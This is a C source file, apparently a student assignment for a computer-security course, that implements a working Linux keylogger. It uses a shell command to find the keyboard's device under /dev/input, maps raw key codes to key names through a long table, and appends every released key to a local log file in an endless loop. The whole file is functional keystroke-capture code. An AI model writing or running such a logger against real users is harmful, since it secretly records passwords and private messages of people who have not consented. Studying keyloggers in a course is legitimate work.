#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>

#define LOGFILEPATH "/home/eduardo/Documentos/Seguridad_Informatica/keylogger/keylogger.txt"

char *getEvent();

const char* teclas(int code) {
    switch (code) {
        case 0: return "Reserved";
        case 1: return "Esc";
        case 2: return "1";
        case 3: return "2";
        case 4: return "3";
        case 5: return "4";
        case 6: return "5";
        case 7: return "6";
        case 8: return "7";
        case 9: return "8";
        case 10: return "9";
        case 11: return "0";
        case 12: return "-";
        case 13: return "=";
        case 14: return "Backspace";
        case 15: return "Tab";
        case 16: return "Q";
        case 17: return "W";
        case 18: return "E";
        case 19: return "R";
        case 20: return "T";
        case 21: return "Y";
        case 22: return "U";
        case 23: return "I";
        case 24: return "O";
        case 25: return "P";
        case 26: return "[";
        case 27: return "]";
        case 28: return "Enter";
        case 29: return "Left Ctrl";
        case 30: return "A";
        case 31: return "S";
        case 32: return "D";
        case 33: return "F";
        case 34: return "G";
        case 35: return "H";
        case 36: return "J";
        case 37: return "K";
        case 38: return "L";
        case 39: return ";";
        case 40: return "'";
        case 41: return "`";
        case 42: return "Left Shift";
        case 43: return "\\";
        case 44: return "Z";
        case 45: return "X";
        case 46: return "C";
        case 47: return "V";
        case 48: return "B";
        case 49: return "N";
        case 50: return "M";
        case 51: return ",";
        case 52: return ".";
        case 53: return "/";
        case 54: return "Right Shift";
        case 55: return "KP *";
        case 56: return "Left Alt";
        case 57: return "Space";
        case 58: return "Caps Lock";
        case 59: return "F1";
        case 60: return "F2";
        case 61: return "F3";
        case 62: return "F4";
        case 63: return "F5";
        case 64: return "F6";
        case 65: return "F7";
        case 66: return "F8";
        case 67: return "F9";
        case 68: return "F10";
        case 69: return "Num Lock";
        case 70: return "Scroll Lock";
        case 71: return "KP 7";
        case 72: return "KP 8";
        case 73: return "KP 9";
        case 74: return "KP -";
        case 75: return "KP 4";
        case 76: return "KP 5";
        case 77: return "KP 6";
        case 78: return "KP +";
        case 79: return "KP 1";
        case 80: return "KP 2";
        case 81: return "KP 3";
        case 82: return "KP 0";
        case 83: return "KP .";
        case 85: return "Zenkaku/Hankaku";
        case 86: return "102nd";
        case 87: return "F11";
        case 88: return "F12";
        case 89: return "RO";
        case 90: return "Katakana";
        case 91: return "Hiragana";
        case 92: return "Henkan";
        case 93: return "Katakana/Hiragana";
        case 94: return "Muhenkan";
        case 95: return "KP Comma";
        case 96: return "KP Enter";
        case 97: return "Right Ctrl";
        case 98: return "KP /";
        case 99: return "SysRq";
        case 100: return "Right Alt";
        case 101: return "Line Feed";
        case 102: return "Home";
        case 103: return "Up";
        case 104: return "Page Up";
        case 105: return "Left";
        case 106: return "Right";
        case 107: return "End";
        case 108: return "Down";
        case 109: return "Page Down";
        case 110: return "Insert";
        case 111: return "Delete";
        case 112: return "Macro";
        case 113: return "Mute";
        case 114: return "Volume Down";
        case 115: return "Volume Up";
        case 116: return "Power";
        case 117: return "KP =";
        case 118: return "KP +/-";
        case 119: return "Pause";
        case 120: return "Scale";
        case 121: return "KP ,";
        case 122: return "Hangeul";
        case 123: return "Hanja";
        case 124: return "Yen";
        case 125: return "Left Meta";
        case 126: return "Right Meta";
        case 127: return "Compose";
        case 128: return "Stop";
        case 129: return "Again";
        case 130: return "Props";
        case 131: return "Undo";
        case 132: return "Front";
        case 133: return "Copy";
        case 134: return "Open";
        case 135: return "Paste";
        case 136: return "Find";
        case 137: return "Cut";
        case 138: return "Help";
        case 139: return "Menu";
        case 140: return "Calc";
        case 141: return "Setup";
        case 142: return "Sleep";
        case 143: return "Wake Up";
        case 144: return "File";
        case 145: return "Send File";
        case 146: return "Delete File";
        case 147: return "Xfer";
        case 148: return "Prog1";
        case 149: return "Prog2";
        case 150: return "WWW";
        case 151: return "MS-DOS";
        case 152: return "Coffee";
        case 153: return "Rotate Display";
        case 154: return "Cycle Windows";
        case 155: return "Mail";
        case 156: return "Bookmarks";
        case 157: return "Computer";
        case 158: return "Back";
        case 159: return "Forward";
        case 160: return "Close CD";
        case 161: return "Eject CD";
        case 162: return "Eject Close CD";
        case 163: return "Next Song";
        case 164: return "Play/Pause";
        case 165: return "Previous Song";
        case 166: return "Stop CD";
        case 167: return "Record";
        case 168: return "Rewind";
        case 169: return "Phone";
        case 170: return "ISO";
        case 171: return "Config";
        case 172: return "Homepage";
        case 173: return "Refresh";
        case 174: return "Exit";
        case 175: return "Move";
        case 176: return "Edit";
        case 177: return "Scroll Up";
        case 178: return "Scroll Down";
        case 179: return "KP Left Parenthesis";
        case 180: return "KP Right Parenthesis";
        case 181: return "New";
        case 182: return "Redo";
        case 183: return "F13";
        case 184: return "F14";
        case 185: return "F15";
        case 186: return "F16";
        case 187: return "F17";
        case 188: return "F18";
        case 189: return "F19";
        case 190: return "F20";
        case 191: return "F21";
        case 192: return "F22";
        case 193: return "F23";
        case 194: return "F24";
        case 200: return "Play CD";
        case 201: return "Pause CD";
        case 202: return "Prog3";
        case 203: return "Prog4";
        case 204: return "All Applications";
        case 205: return "Suspend";
        case 206: return "Close";
        case 207: return "Play";
        case 208: return "Fast Forward";
        case 209: return "Bass Boost";
        case 210: return "Print";
        case 211: return "HP";
        case 212: return "Camera";
        case 213: return "Sound";
        case 214: return "Question";
        case 215: return "Email";
        case 216: return "Chat";
        case 217: return "Search";
        case 218: return "Connect";
        case 219: return "Finance";
        case 220: return "Sport";
        case 221: return "Shop";
        case 222: return "Alterase";
        case 223: return "Cancel";
        case 224: return "Brightness Down";
        case 225: return "Brightness Up";
        case 226: return "Media";
        case 227: return "Switch Video Mode";
        case 228: return "KBD Illum Toggle";
        case 229: return "KBD Illum Down";
        case 230: return "KBD Illum Up";
        case 231: return "Send";
        case 232: return "Reply";
        case 233: return "Forward Mail";
        case 234: return "Save";
        case 235: return "Documents";
        case 236: return "Battery";
        case 237: return "Bluetooth";
        case 238: return "WLAN";
        case 239: return "UWB";
        case 240: return "Unknown";
        case 241: return "Video Next";
        case 242: return "Video Prev";
        case 243: return "Brightness Cycle";
        case 244: return "Brightness Auto";
        case 245: return "Display Off";
        case 246: return "WWAN";
        case 247: return "RF Kill";
        case 248: return "Mic Mute";
        default: return "Unknown";
    }
}

int main(){
  struct input_event ev;
  // ruta al directorio de inputs
  static char path_keyboard[20] = "/dev/input/";
  // concatenar variable keyboard
  strcat(path_keyboard, getEvent());
  // eliminar último caracter (breakline)
  path_keyboard[strlen(path_keyboard)-1] = 0;
  // leer ruta a input
  int device_keyboard = open(path_keyboard, O_RDONLY);
  // imprimir error
  if (errno > 0) {
    printf("Error: %d\n", errno);
  }
  // abrir fichero de logs
  FILE *fp = fopen(LOGFILEPATH, "a");
  while (1) {
    read(device_keyboard, &ev, sizeof(ev));
    if (ev.type == EV_KEY && ev.value == 0) {
    	const char *tecla = teclas(ev.code);
    	//Aqui intenté que distinguiera entre mayusculas y minusculas
    	//if (ev.type == EV_LED && ev.code == LED_CAPSL) {
        //	if (ev.value){
      			//printf("%d\n", ev.code);
      	fprintf(fp, "%s", tecla);
      	fflush(fp);
      	//	}
      	//}    	
      	
      // Hacer la conversión para que en el fichero de keylogger.txt se escriba lo que escribe el usuario
      // Entregar link github con el fichero c + README con instrucciones de uso, supuestos del sistema y casos de uso.
      // Entregar antes de la siguiente clase 15/agosto/2024 antes de las 14:00
      // Individual
    }
  }
  fclose(fp);
  close(device_keyboard);
}

char *getEvent(){
  // leer el fichero devices y extraer el input que se refiera al teclado
  char *command =  (char *) "cat /proc/bus/input/devices | grep -C 5 keyboard | grep -E -o 'event[0-9]'";
  static char event[8];
  FILE *pipe = popen(command, "r");
  if (!pipe)
    exit(1);
  // obtener la cadena de texto del evento correspondiente al teclado
  fgets(event, 8, pipe);
  pclose(pipe);
  // retornar el evento
  return event;
}
